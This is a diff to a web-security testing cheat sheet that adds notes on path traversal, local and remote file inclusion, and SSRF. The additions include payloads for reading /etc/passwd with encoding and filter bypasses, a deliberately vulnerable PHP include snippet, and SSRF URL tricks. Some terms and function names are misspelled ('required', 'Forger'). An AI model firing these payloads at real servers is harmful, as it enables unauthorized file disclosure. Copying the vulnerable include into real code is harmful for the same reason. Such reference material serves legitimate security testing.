@@ -71,11 +71,24 @@ A good way to check for an IDOR vulnerability is to create two accounts and see 
 
 ## File inclusion
 
+A file inclusion vulnerability is caused when a malicious user can access or upload unathorized files or directories.
+
+There are three main types of file inclusion vulnerabilities:
+
+- Path traversal
+- Local File Intrusion (LFI)
+- Remote File Inclusion (RFI)
+
+### Path traversal
+
+The attacker can access files in other directories of the server.
+Usually, this type of attack is based on dot-dot-slash notation.
+
 ```bash
-# simple dot-dot-slash notation
+# basic dot-dot-slash notation
 ../../../etc/passwd
 
-# ascii notation
+# ascii version
 %2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
 
 # truncate string (PHP < 5.3.4) using null byte
@@ -83,7 +96,7 @@ A good way to check for an IDOR vulnerability is to create two accounts and see 
 ../../../etc/passwd%00
 ../../../etc/passwd\0
 
-# if validation is done over the first 'etc' match and right after string
+# if validation is done over the first match of the string 'etc' and what is right after
 ../../../etc/../etc/passwd
 
 # if '/etc/passwd' is filtered
@@ -91,4 +104,36 @@ A good way to check for an IDOR vulnerability is to create two accounts and see 
 
 # if '../' is removed
 ....//....//....//....//....//etc/passwd
+```
+
+### LFI
+
+In Local File Intrusion (LFI) the attacker makes the server to include other local script files.
+
+The main difference with path traversal is the execution of scripts decided by the attacker.
+
+In PHP this could happen with functions like `include`, `required`, `include_once`, and `required_once`.
+
+```php
+<?php
+  include("./pages/".$_GET["page"]);
+?>
+```
+
+### RFI
+
+In Remote File Inclusion (RFI) the attacker makes the server to include other script files from external sources.
+
+## SSRF
+
+Server Side Request Forger (SSRF) is a type of vulnerability that allows a malicious user to have the server execute a custom request.
+
+### Custom requests
+
+If you can specify the domain using a query param, you can use `&x=` to remove the base url.
+
+```
+http://website.com/items?server=api.website.com/users?id=123&x=
+
+http://api.website.com/users?id=123&x=website.com/items
 ```
